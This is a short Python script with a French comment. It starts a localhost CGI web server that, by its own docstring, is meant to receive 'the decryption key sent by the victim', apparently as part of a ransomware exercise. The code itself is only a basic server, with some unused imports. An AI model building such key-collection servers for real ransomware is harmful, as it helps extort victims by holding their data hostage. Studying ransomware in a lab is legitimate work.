import http.server
import requests
import threading


"""
Le serveur hébergera la clé de déchiffrement envoyé par la victime.
"""

port = 8080
server_address = ("127.0.0.1", port) #Création d'un serveur web en localhost
server = http.server.HTTPServer
handler = http.server.CGIHTTPRequestHandler
handler.cgi_directories = ["./"]
print("Serveur actif sur le port :", port)
httpd = server(server_address, handler)
httpd.serve_forever()

